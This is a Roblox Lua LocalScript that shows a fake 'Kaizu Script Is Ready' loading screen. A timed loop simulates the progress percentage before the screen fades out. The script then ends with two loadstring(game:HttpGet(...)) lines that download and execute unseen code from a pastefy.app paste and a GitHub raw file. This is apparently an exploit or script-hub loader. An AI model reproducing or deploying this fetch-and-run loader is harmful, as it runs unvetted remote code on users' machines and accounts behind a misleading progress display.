-- LocalScript inside StarterGui

local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Services
local TweenService = game:GetService("TweenService")

-- ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "KaizuLoadingScreen"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Background Frame
local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
bg.Parent = screenGui

-- Title Text
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0.2, 0)
title.Position = UDim2.new(0, 0, 0.3, 0)
title.BackgroundTransparency = 1
title.Text = "Kaizu Script Is Ready"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.Parent = bg

-- Loading Percentage
local percent = Instance.new("TextLabel")
percent.Size = UDim2.new(1, 0, 0.1, 0)
percent.Position = UDim2.new(0, 0, 0.5, 0)
percent.BackgroundTransparency = 1
percent.Text = "Loading... 0%"
percent.TextColor3 = Color3.fromRGB(0, 200, 255)
percent.TextScaled = true
percent.Font = Enum.Font.GothamBold
percent.Parent = bg

-- Simulate loading to 100%
for i = 1, 100 do
	percent.Text = "Loading... " .. i .. "%"
	task.wait(0.03) -- speed of loading
end

-- Final text
percent.Text = "Kaizu Script Is Ready - 100%"

-- Wait a moment, then fade out
task.wait(1)

local fade = TweenService:Create(bg, TweenInfo.new(1), {BackgroundTransparency = 1})
fade:Play()

for _, obj in pairs(bg:GetChildren()) do
	if obj:IsA("TextLabel") then
		local fadeText = TweenService:Create(obj, TweenInfo.new(1), {TextTransparency = 1})
		fadeText:Play()
	end
end

fade.Completed:Wait()
screenGui:Destroy()
loadstring(game:HttpGet("https://pastefy.app/alOG09mi/raw"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ZusumeHub/ZusumeHub/refs/heads/main/UpdateZysume"))()
